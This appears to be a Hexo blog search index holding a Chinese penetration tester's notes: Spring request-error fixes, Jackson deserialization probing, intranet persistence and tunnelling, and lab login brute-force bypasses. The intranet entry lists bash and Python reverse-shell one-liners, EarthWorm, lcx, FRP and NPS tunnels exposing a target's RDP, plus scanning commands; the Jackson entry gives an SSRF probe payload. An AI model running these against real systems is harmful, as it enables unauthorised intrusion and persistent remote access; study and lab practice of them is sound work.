<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>spring常见报错构造发包</title>
    <url>/2025/07/03/spring%E5%B8%B8%E8%A7%81%E6%8A%A5%E9%94%99%E4%BF%AE%E5%A4%8D/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>真是一个渗透半个开发</p>
<p>有时根据api直接构造请求包会报错500，不是发不了，只是可能请求头或请求体构造的不一样，已接触的报错记录如下：</p>
<p>Spring MVC、Spring Boot的文件上传报错记录</p>
<span id="more"></span>



<h2 id="关键字-multipart-request"><a href="#关键字-multipart-request" class="headerlink" title="关键字&#x3D;&#x3D;&gt;multipart request"></a>关键字&#x3D;&#x3D;&gt;multipart request</h2><h5 id="通常出现于文件上传"><a href="#通常出现于文件上传" class="headerlink" title="通常出现于文件上传"></a>通常出现于文件上传</h5><p>详细报错大致如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">current request is not a multipart request</span><br></pre></td></tr></table></figure>

<h3 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h3><h5 id="Content-Type：multipart-form-data"><a href="#Content-Type：multipart-form-data" class="headerlink" title="&#x3D;&#x3D;&gt;Content-Type：multipart&#x2F;form-data"></a>&#x3D;&#x3D;&gt;Content-Type：multipart&#x2F;form-data</h5><p>原因如下：</p>
<ol>
<li>前端上传表单没设置 <code>enctype=&quot;multipart/form-data&quot;</code></li>
</ol>
<ul>
<li>如果你用的是 <code>&lt;form&gt;</code> 提交，必须加上：</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 其他参数 --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<hr>
<ol start="2">
<li>使用 Ajax&#x2F;Fetch 上传时，没用 FormData 对象</li>
</ol>
<ul>
<li>用 JS 上传文件时，必须使用 <code>FormData</code> 对象，并且不能手动设置 <code>Content-Type</code>，浏览器会自动加。</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> formData = <span class="keyword">new</span> <span class="title class_">FormData</span>();</span><br><span class="line">formData.<span class="title function_">append</span>(<span class="string">&#x27;file&#x27;</span>, fileInput.<span class="property">files</span>[<span class="number">0</span>]);</span><br><span class="line">formData.<span class="title function_">append</span>(<span class="string">&#x27;term&#x27;</span>, <span class="string">&#x27;2&#x27;</span>);</span><br><span class="line">formData.<span class="title function_">append</span>(<span class="string">&#x27;id&#x27;</span>, <span class="string">&#x27;xxx&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;/upload&#x27;</span>, &#123;</span><br><span class="line">  <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">  <span class="attr">body</span>: formData</span><br><span class="line">  <span class="comment">// 不要手动设置 headers 的 Content-Type</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<hr>
<ol start="3">
<li>后台接口没有正确解析 multipart 请求</li>
</ol>
<ul>
<li>例如在 Spring Boot 中，需要用 <code>@RequestParam MultipartFile file</code> 来接收文件。</li>
<li>还需要确保依赖（如 Commons FileUpload）已导入并且 Multipart 解析已开启。</li>
</ul>
<h3 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h3><p>后续可能还会报错说你缺乏什么参数，例如：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">The request was rejected because no multipart boundary was found</span><br></pre></td></tr></table></figure>

<p>解决方法：</p>
<h5 id="类型后面直接跟参数即可"><a href="#类型后面直接跟参数即可" class="headerlink" title="类型后面直接跟参数即可"></a>类型后面直接跟参数即可</h5><p>例如：</p>
<p>Content-Type: multipart&#x2F;form-data; boundary&#x3D;—-WebKitFormBoundaryxxxxxx</p>
<p>请求体注意同样，我的建议是直接在同一个网址下找到另外一个文件上传，直接copy过来，或者找到对应的js，直接本地部署一下，实话说能不猜就别猜</p>
<h2 id="关键字-is-not-present"><a href="#关键字-is-not-present" class="headerlink" title="关键字&#x3D;&#x3D;&gt;is not present"></a>关键字&#x3D;&#x3D;&gt;is not present</h2><p>全称</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">required string parameter &#x27;xxx&#x27; is not present</span><br></pre></td></tr></table></figure>

<p>意思是少了一个参数，直接把xxx接在url后面就行了</p>
<h3 id="解决方法-1"><a href="#解决方法-1" class="headerlink" title="解决方法"></a>解决方法</h3><h5 id="param-xxx"><a href="#param-xxx" class="headerlink" title="&#x3D;&#x3D;&gt;?param&#x3D;&amp;xxx&#x3D;"></a>&#x3D;&#x3D;&gt;?param&#x3D;&amp;xxx&#x3D;</h5><h5 id="form-data-name-”parm”"><a href="#form-data-name-”parm”" class="headerlink" title="&#x3D;&#x3D;&gt;form-data;name&#x3D;”parm”"></a>&#x3D;&#x3D;&gt;form-data;name&#x3D;”parm”</h5><p>第二中方法适用于上传多参数：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">----WebKitFormBoundaryxxxxxx---</span><br><span class="line"></span><br><span class="line">content-Disposition: form-data; name=&quot;parm&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">math</span><br><span class="line"></span><br><span class="line">----WebKitFormBoundaryxxxxxx---</span><br></pre></td></tr></table></figure>

<h2 id="关键字-Failed-to-parse"><a href="#关键字-Failed-to-parse" class="headerlink" title="关键字&#x3D;&#x3D;&gt;Failed to parse"></a>关键字&#x3D;&#x3D;&gt;Failed to parse</h2><p>全称</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Failed to parse multipart servlet request</span><br></pre></td></tr></table></figure>

<p>意思是文件过大了</p>
<h3 id="解决方法-2"><a href="#解决方法-2" class="headerlink" title="解决方法"></a>解决方法</h3><h5 id="减少内容"><a href="#减少内容" class="headerlink" title="&#x3D;&#x3D;&gt;减少内容"></a>&#x3D;&#x3D;&gt;减少内容</h5><h2 id="关键字-”xxx”-not-supported"><a href="#关键字-”xxx”-not-supported" class="headerlink" title="关键字&#x3D;&#x3D;&gt;”xxx” not supported"></a>关键字&#x3D;&#x3D;&gt;”xxx” not supported</h2><p>全称</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Request method &#x27;POST&#x27; not supported</span><br></pre></td></tr></table></figure>

<p>意思是不支持post</p>
<h3 id="解决方法-3"><a href="#解决方法-3" class="headerlink" title="解决方法"></a>解决方法</h3><h5 id="”POST”-”GET”"><a href="#”POST”-”GET”" class="headerlink" title="&#x3D;&#x3D;&gt;”POST”&#x3D;&#x3D;&gt;”GET”"></a>&#x3D;&#x3D;&gt;”POST”&#x3D;&#x3D;&gt;”GET”</h5><h2 id="关键字-request-body"><a href="#关键字-request-body" class="headerlink" title="关键字&#x3D;&#x3D;&gt;request body"></a>关键字&#x3D;&#x3D;&gt;request body</h2><p>全称</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Could not parse request body</span><br></pre></td></tr></table></figure>

<p>前端发的是 JSON，但后端没用 <code>@RequestBody</code> 接收；或者反之。</p>
<h3 id="解决方法-4"><a href="#解决方法-4" class="headerlink" title="解决方法"></a>解决方法</h3><h5 id="修改请求体"><a href="#修改请求体" class="headerlink" title="&#x3D;&#x3D;&gt;修改请求体"></a>&#x3D;&#x3D;&gt;修改请求体</h5>]]></content>
      <categories>
        <category>Cybersecurity</category>
      </categories>
      <tags>
        <tag>article</tag>
      </tags>
  </entry>
  <entry>
    <title>反序列化漏洞积累</title>
    <url>/2025/07/02/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h1 id="1-反序列化"><a href="#1-反序列化" class="headerlink" title="1-反序列化"></a>1-反序列化</h1><h2 id="1-jackson记录"><a href="#1-jackson记录" class="headerlink" title="[1] jackson记录"></a>[1] jackson记录</h2><p>以目的为导向就是，用[]进行测试判断该参数是否为object类型，是则用ssrf的payload</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;test&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;javax.swing.JEditorPane&quot;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span><span class="attr">&quot;page&quot;</span><span class="punctuation">:</span><span class="string">&quot;http://你的服务ip:8000&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>来测试是否存在jackson的反序列漏洞</p>
<span id="more"></span>

<p>参考文章<a href="https://zhuanlan.zhihu.com/p/344568487">Jackson反序列化漏洞 - 知乎</a></p>
<h3 id="Jackson-反序列化漏洞原理"><a href="#Jackson-反序列化漏洞原理" class="headerlink" title="Jackson 反序列化漏洞原理"></a>Jackson 反序列化漏洞原理</h3><h5 id="1-1-多态反序列化（Polymorphic-Deserialization）"><a href="#1-1-多态反序列化（Polymorphic-Deserialization）" class="headerlink" title="1.1 多态反序列化（Polymorphic Deserialization）"></a>1.1 多态反序列化（Polymorphic Deserialization）</h5><p>Jackson 支持将 JSON 自动反序列化为多种类型的 Java 对象，特别是当某字段的类型为 <code>Object</code>、接口或抽象类时，Jackson 允许通过类型信息确定具体类。</p>
<h5 id="常见两种类型标识方式："><a href="#常见两种类型标识方式：" class="headerlink" title="常见两种类型标识方式："></a>常见两种类型标识方式：</h5><ul>
<li><p><strong>外部数组型标识（默认启用）</strong>：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="attr">&quot;data&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;com.example.SomeClass&quot;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span> <span class="attr">&quot;field&quot;</span><span class="punctuation">:</span> <span class="string">&quot;value&quot;</span> <span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>注解型标识（显式开启）</strong>：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="attr">&quot;data&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@class&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.example.SomeClass&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;field&quot;</span><span class="punctuation">:</span> <span class="string">&quot;value&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>1.2 漏洞产生的根因</p>
<ul>
<li>Jackson 允许用户从 JSON 中指定任意类名。</li>
<li>反序列化时会自动调用类的构造函数、setter 或 <code>readObject</code> 方法，甚至可能触发危险行为。</li>
<li>攻击者可伪造 payload 利用 Gadget（利用链）执行任意代码。</li>
</ul>
<h5 id="1-3-默认-Typing-的影响"><a href="#1-3-默认-Typing-的影响" class="headerlink" title="1.3 默认 Typing 的影响"></a>1.3 默认 Typing 的影响</h5><p>如果后端配置了：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line">mapper.enableDefaultTyping(); <span class="comment">// 旧版本默认启用</span></span><br></pre></td></tr></table></figure>

<p>那么所有非 final 类型（如 Object、Map、List 等）都会被自动启用多态反序列化</p>
<h3 id="—-Fastjson对比—"><a href="#—-Fastjson对比—" class="headerlink" title="—-Fastjson对比—-"></a>—-Fastjson对比—-</h3><table>
<thead>
<tr>
<th>特性</th>
<th>Jackson</th>
<th>Fastjson</th>
</tr>
</thead>
<tbody><tr>
<td>是否支持多态反序列化</td>
<td>✅ 支持（默认 Object 类型自动支持）</td>
<td>✅ 支持（需要特定字段）</td>
</tr>
<tr>
<td>默认是否开启</td>
<td>✅ <code>Object</code>, <code>Object[]</code> 自动支持多态</td>
<td>❌ 需显示写入 <code>@type</code></td>
</tr>
<tr>
<td>多态字段名称</td>
<td>类名写在数组或配置的 <code>@class</code> 字段中</td>
<td><strong>@type</strong>（固定字段名）</td>
</tr>
<tr>
<td>利用条件</td>
<td>字段为 Object 或接口（或启用了 DefaultTyping）</td>
<td>JSON 中有 <code>@type</code> 且服务未禁用 AutoType</td>
</tr>
<tr>
<td>修复方法</td>
<td>禁用 DefaultTyping、白名单类</td>
<td>关闭 <code>autoTypeSupport</code>、升级版本、白名单</td>
</tr>
<tr>
<td>gadget 丰富程度</td>
<td>中等（依赖 commons-* 等库）</td>
<td>非常多（内置支持多类库）</td>
</tr>
</tbody></table>
<h2 id="0-推荐工具利用"><a href="#0-推荐工具利用" class="headerlink" title="[0]推荐工具利用"></a>[0]推荐工具利用</h2><p><a href="https://github.com/mbechler/marshalsec">marshalsec</a></p>
<p>生成恶意 LDAP&#x2F;RMI 服务，配合 Java 反序列化漏洞实现 RCE</p>
]]></content>
      <categories>
        <category>Cybersecurity</category>
      </categories>
      <tags>
        <tag>Backend</tag>
      </tags>
  </entry>
  <entry>
    <title>emby逆向记录</title>
    <url>/2025/06/24/emby%E9%80%86%E5%90%91%E7%A0%94%E7%A9%B6/</url>
    <content><![CDATA[<h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1-前言"></a>1-前言</h1><p>参考文章<a href="https://www.52pojie.cn/thread-1847431-1-1.html">破解Emby Server&#x2F;Client For iOS&#x2F;MacOS&#x2F;Linux&#x2F;Android 通杀方案 - 吾爱破解 - 52pojie.cn</a></p>
<p>逆向案例，但好像也只解决的显示问题，对于硬解，可能需要搭建服务器传输必要参数内容才行。</p>
]]></content>
      <categories>
        <category>Reverse</category>
      </categories>
      <tags>
        <tag>article</tag>
      </tags>
  </entry>
  <entry>
    <title>内网横向+加固</title>
    <url>/2025/06/24/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91-%E5%8A%A0%E5%9B%BA/</url>
    <content><![CDATA[<h1 id="1-加固"><a href="#1-加固" class="headerlink" title="1-加固"></a>1-加固</h1><h2 id="Reverse-Shell定时任务"><a href="#Reverse-Shell定时任务" class="headerlink" title="Reverse Shell定时任务"></a>Reverse Shell定时任务</h2><h3 id="定时任务-系统级或用户级自启"><a href="#定时任务-系统级或用户级自启" class="headerlink" title="#定时任务&amp;系统级或用户级自启"></a>#定时任务&amp;系统级或用户级自启</h3><h5 id="反向ssh"><a href="#反向ssh" class="headerlink" title="#反向ssh"></a>#反向ssh</h5><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">ssh -R <span class="number">6000</span>:localhost:<span class="number">22</span> user@A的公网IP</span><br></pre></td></tr></table></figure>

<h5 id="反弹shell"><a href="#反弹shell" class="headerlink" title="#反弹shell"></a>#反弹shell</h5><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/<span class="number">10</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>/<span class="number">8080</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>#python</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])&#x27;</span></span><br></pre></td></tr></table></figure>

<h5 id="使用-Zerotier-Tailscale-搭建虚拟局域网"><a href="#使用-Zerotier-Tailscale-搭建虚拟局域网" class="headerlink" title="#使用 Zerotier &#x2F; Tailscale 搭建虚拟局域网"></a>#使用 Zerotier &#x2F; Tailscale 搭建虚拟局域网</h5><p>或者使用sock代理，处于同一网络易漏扫，连接方式，下载<a href="https://github.com/idlefire/ew">EarthWorm</a></p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">ew -s rcsocks -l <span class="number">1900</span> -e <span class="number">1200</span></span><br><span class="line">ew -s rssocks -d xxx.xxx.xxx.xxx(公网VPS IP) -e <span class="number">1200</span></span><br></pre></td></tr></table></figure>

<h5 id="内存码的注入"><a href="#内存码的注入" class="headerlink" title="#内存码的注入"></a>#内存码的注入</h5><h5 id="cs木马"><a href="#cs木马" class="headerlink" title="#cs木马"></a>#cs木马</h5><span id="more"></span>

<h1 id="2-横向"><a href="#2-横向" class="headerlink" title="2-横向"></a>2-横向</h1><h2 id="内网探测"><a href="#内网探测" class="headerlink" title="#内网探测"></a>#内网探测</h2><h5 id="探测主机-端口"><a href="#探测主机-端口" class="headerlink" title="#探测主机+端口"></a>#探测主机+端口</h5><p>详细可见另外一篇文章<a href="https://cliayn.github.io/2025/04/23/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/">内网信息搜集</a></p>
<p>若使用了sock，则直接使用nmap</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sn 192.168.1.0/24</span><br><span class="line"></span><br><span class="line">#端口扫描</span><br><span class="line">nmap -p 1-65535 192.168.1.100</span><br></pre></td></tr></table></figure>

<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">   #ladon上传到目标系统中，通过ladon扫描内网系统</span><br><span class="line">landon <span class="number">192</span>.<span class="number">168</span>.<span class="number">200</span>.<span class="number">1</span>/<span class="number">24</span>    OsScan	</span><br><span class="line">#直接漏扫</span><br><span class="line">landon <span class="number">192</span>.<span class="number">168</span>.<span class="number">200</span>.<span class="number">1</span>/<span class="number">24</span> 漏洞类型</span><br><span class="line">#连接sock5漏扫</span><br><span class="line">proxychains msfconsole</span><br></pre></td></tr></table></figure>

<p>若没有，则使用ping</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.&#123;<span class="number">1</span>..<span class="number">254</span>&#125;; <span class="keyword">do</span> <span class="built_in">ping</span> -c <span class="number">1</span> -W <span class="number">1</span> $ip &amp;&gt;/dev/null &amp;&amp; <span class="built_in">echo</span> &quot;$ip is up&quot;; done</span><br><span class="line"></span><br><span class="line">#查看arp缓存</span><br><span class="line">arp -a</span><br></pre></td></tr></table></figure>

<h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="#内网渗透"></a>#内网渗透</h2><h5 id="排查服务"><a href="#排查服务" class="headerlink" title="#排查服务"></a>#排查服务</h5><p>处于同一虚拟局域网内直接<strong>主机渗透</strong>和<strong>web渗透</strong></p>
<h5 id="排查备份"><a href="#排查备份" class="headerlink" title="#排查备份"></a>#排查备份</h5><p>存在快照&#x2F;镜像直接拷贝本地运行</p>
<h5 id="排查数据库"><a href="#排查数据库" class="headerlink" title="#排查数据库"></a>#排查数据库</h5><h5 id="排查敏感端口"><a href="#排查敏感端口" class="headerlink" title="#排查敏感端口"></a>#排查敏感端口</h5><h5 id="排查密码箱"><a href="#排查密码箱" class="headerlink" title="#排查密码箱"></a>#排查密码箱</h5><p>尝试mimikatz解密哈希</p>
<h1 id="补充知识"><a href="#补充知识" class="headerlink" title="#补充知识"></a>#补充知识</h1><p>详细可见—戟星安全实验室的<a href="https://github.com/MrWQ/vulnerability-paper/blob/b60b05e87904b834ef707eaf18ca5c15eb972edf/intranet/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF%EF%BC%8C%E4%BD%A0%E7%9F%A5%E9%81%93%E5%87%A0%E4%B8%AA%EF%BC%9F.md">内网隧道技术</a></p>
<h2 id="1-lcx-隧道（针对-exe-工具的案例）"><a href="#1-lcx-隧道（针对-exe-工具的案例）" class="headerlink" title="1. lcx 隧道（针对 .exe 工具的案例）"></a>1. lcx 隧道（针对 .exe 工具的案例）</h2><p><strong>目标机器（受控端）执行：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lcx.exe -slave 攻击机IP 9999 127.0.0.1 3389</span><br></pre></td></tr></table></figure>

<ul>
<li>将本地 3389 端口的连接转发至攻击机 IP:9999。</li>
</ul>
<p><strong>VPS 或攻击机（监听端）执行：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lcx.exe -listen 9999 10000</span><br></pre></td></tr></table></figure>

<ul>
<li>监听 9999 端口接收隧道数据，并将其转发至本地 10000 端口。</li>
</ul>
<p><strong>连接方式：</strong></p>
<ul>
<li>在本机（或 VPS）通过 RDP 连接 <code>127.0.0.1:10000</code>，即可访问目标机器的 RDP 服务。</li>
</ul>
<hr>
<h2 id="2-FRP-（fast-reverse-proxy）"><a href="#2-FRP-（fast-reverse-proxy）" class="headerlink" title="2. FRP （fast reverse proxy）"></a>2. FRP （fast reverse proxy）</h2><h3 id="服务端（公网-VPS）frps-配置"><a href="#服务端（公网-VPS）frps-配置" class="headerlink" title="服务端（公网 VPS）frps + 配置"></a>服务端（公网 VPS）frps + 配置</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># frps.ini</span><br><span class="line">[common]</span><br><span class="line">bind_port = 7000</span><br></pre></td></tr></table></figure>

<p>启动服务器：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./frps -c frps.ini</span><br></pre></td></tr></table></figure>

<h3 id="客户端（内网目标）frpc-配置"><a href="#客户端（内网目标）frpc-配置" class="headerlink" title="客户端（内网目标）frpc + 配置"></a>客户端（内网目标）frpc + 配置</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># frpc.ini</span><br><span class="line">[common]</span><br><span class="line">server_addr = &lt;VPS_IP&gt;</span><br><span class="line">server_port = 7000</span><br><span class="line"></span><br><span class="line">[rdp]</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 127.0.0.1</span><br><span class="line">local_port = 3389</span><br><span class="line">remote_port = 6000</span><br></pre></td></tr></table></figure>

<p>启动客户端：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./frpc -c frpc.ini</span><br></pre></td></tr></table></figure>

<h3 id="连接方式"><a href="#连接方式" class="headerlink" title="连接方式"></a>连接方式</h3><ul>
<li>使用 RDP 客户端连接 <code>VPS_IP:6000</code>，即可访问目标机器的 RDP 服务 </li>
<li><a href="https://www.junjienotes.com/tips/%E9%80%9A%E8%BF%87frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E5%AE%9E%E7%8E%B0windows-rdp%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E6%8E%A7%E5%88%B6/?utm_source=chatgpt.com"><strong>通过FRP内网穿透实现Windows RDP远程桌面控制</strong></a></li>
<li><a href="https://blog.csdn.net/qq_42688495/article/details/123120151?utm_source=chatgpt.com"><strong>FRP内网穿透</strong></a>。</li>
</ul>
<hr>
<h2 id="3-NPS（内网穿透代理）"><a href="#3-NPS（内网穿透代理）" class="headerlink" title="3. NPS（内网穿透代理）"></a>3. NPS（内网穿透代理）</h2><h3 id="服务端（VPS）："><a href="#服务端（VPS）：" class="headerlink" title="服务端（VPS）："></a>服务端（VPS）：</h3><p>下载并运行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./nps -c nps.conf</span><br></pre></td></tr></table></figure>

<p>或安装为服务，访问 Web 控制面板配置端口转发 。</p>
<p>您可在 Web 界面添加 TCP 映射，如映射内网主机的 3389 端口到公网端口。</p>
<h3 id="客户端（内网目标）"><a href="#客户端（内网目标）" class="headerlink" title="客户端（内网目标）"></a>客户端（内网目标）</h3><p>编辑 <code>npc.conf</code>，指定要连接的 server 和 key，然后运行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./npc -c npc.conf</span><br></pre></td></tr></table></figure>

<p>完毕后即可通过映射的公网端口访问目标内网 RDP 服务 。</p>
<hr>
<h3 id="对比总结"><a href="#对比总结" class="headerlink" title="对比总结"></a>对比总结</h3><table>
<thead>
<tr>
<th>工具</th>
<th>架构</th>
<th>配置方式</th>
<th>优劣</th>
</tr>
</thead>
<tbody><tr>
<td>lcx</td>
<td>客户端 ↔ VPS ↔ 本地</td>
<td>命令行参数</td>
<td>简单直接，但需两个进程</td>
</tr>
<tr>
<td>FRP</td>
<td>frpc ↔ frps</td>
<td>frp.ini 文件，支持多个隧道</td>
<td>灵活、功能丰富</td>
</tr>
<tr>
<td>NPS</td>
<td>npc ↔ nps</td>
<td>支持 Web 面板配置</td>
<td>更方便管理，功能强大</td>
</tr>
</tbody></table>
<hr>
<h3 id="使用建议"><a href="#使用建议" class="headerlink" title="*** 使用建议"></a>*** 使用建议</h3><ul>
<li><strong>测试&#x2F;临时场景</strong>：lcx 非常直接，只需一条命令即可完成。</li>
<li><strong>稳定&#x2F;多隧道需求</strong>：推荐 FRP，支持多个端口，配置灵活，兼容性广。</li>
<li><strong>可视化管理&#x2F;复杂映射</strong>：NPS 带 Web 界面，适合多人协作和频繁配置调整。</li>
</ul>
<hr>
<p><strong>扩展：SSH隧道示例</strong>（通用）：</p>
<p><strong>客户端执行：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -R 6000:localhost:3389 user@VPS_IP</span><br></pre></td></tr></table></figure>

<ul>
<li>将内网端 RDP 3389 转发到 VPS 的 6000 端口。</li>
</ul>
<p>在 VPS 使用 <code>localhost:6000</code> 即可访问目标。</p>
<h2 id="内网穿透-总结"><a href="#内网穿透-总结" class="headerlink" title="#内网穿透-总结"></a>#内网穿透-总结</h2><p>说白了，内网穿透就是一个端口映射问题，</p>
]]></content>
      <categories>
        <category>Cybersecurity</category>
      </categories>
      <tags>
        <tag>Intranet</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场练习-身份认证</title>
    <url>/2025/06/17/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="靶场练习"><a href="#靶场练习" class="headerlink" title="靶场练习"></a>靶场练习</h1><h2 id="身份认证"><a href="#身份认证" class="headerlink" title="身份认证"></a>身份认证</h2><h3 id="响应时间异常"><a href="#响应时间异常" class="headerlink" title="响应时间异常"></a>响应时间异常</h3><h5 id="利用因子：存在响应时间判断用户名的可能"><a href="#利用因子：存在响应时间判断用户名的可能" class="headerlink" title="利用因子：存在响应时间判断用户名的可能"></a>利用因子：存在响应时间判断用户名的可能</h5><p>密码账号认证存在响应时间差距，当密码长度100+时，用户名正确，校验密码时间将过长，适用于按顺序解析的账号密码</p>
<p>注：新版bp没有respose time了，可以用如下列，也可以用logger++插件</p>
<table>
<thead>
<tr>
<th align="center">字段</th>
<th align="center">含义</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>Response received</strong></td>
<td align="center">收到响应头的时间（即服务端开始响应）</td>
</tr>
<tr>
<td align="center"><strong>Response completed</strong></td>
<td align="center">整个响应体（HTML&#x2F;JSON等）加载完的时间</td>
</tr>
</tbody></table>
<span id="more"></span>

<h3 id="限制失败次数"><a href="#限制失败次数" class="headerlink" title="限制失败次数"></a>限制失败次数</h3><h5 id="利用因子：登录会刷新积累的失败次数"><a href="#利用因子：登录会刷新积累的失败次数" class="headerlink" title="利用因子：登录会刷新积累的失败次数"></a>利用因子：登录会刷新积累的失败次数</h5><p>正确账号密码绕过爆破限制，就是时不时登录已知的正确账号刷新失败次数</p>
<p>注：X-Forwarded-For: 116.23.165.1 一般不用这个了，比较远古</p>
<h3 id="限制账号登录"><a href="#限制账号登录" class="headerlink" title="限制账号登录"></a>限制账号登录</h3><h5 id="利用因子：用户体量极大"><a href="#利用因子：用户体量极大" class="headerlink" title="利用因子：用户体量极大"></a>利用因子：用户体量极大</h5><p>爆破随机账号，适用于用户体量大的</p>
<p>即任意账号，限制密码个数</p>
<h3 id="常规账号登录"><a href="#常规账号登录" class="headerlink" title="常规账号登录"></a>常规账号登录</h3><h5 id="利用因子：存在多个认证因素时，不报错"><a href="#利用因子：存在多个认证因素时，不报错" class="headerlink" title="利用因子：存在多个认证因素时，不报错"></a>利用因子：存在多个认证因素时，不报错</h5><p>例如：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;user&quot;</span><span class="punctuation">:</span><span class="string">&quot;carlos&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;pass&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;abc&quot;</span><span class="punctuation">,</span><span class="string">&quot;123456&quot;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>



<h3 id="—多因素认证—"><a href="#—多因素认证—" class="headerlink" title="—多因素认证—"></a>—多因素认证—</h3><hr>
<h5 id="–-第二因素脆弱"><a href="#–-第二因素脆弱" class="headerlink" title="–!第二因素脆弱"></a>–!第二因素脆弱</h5><p>例如：图形验证码可用captcha-killer插件绕过，短信验证码4位数字可爆破</p>
<p>如果是人脸或者指纹、加密狗这类的，建议直接<strong>前端绕过</strong>跑api，或者寻找<strong>注册接口</strong>，也可以尝试<strong>伪造用户标识</strong></p>
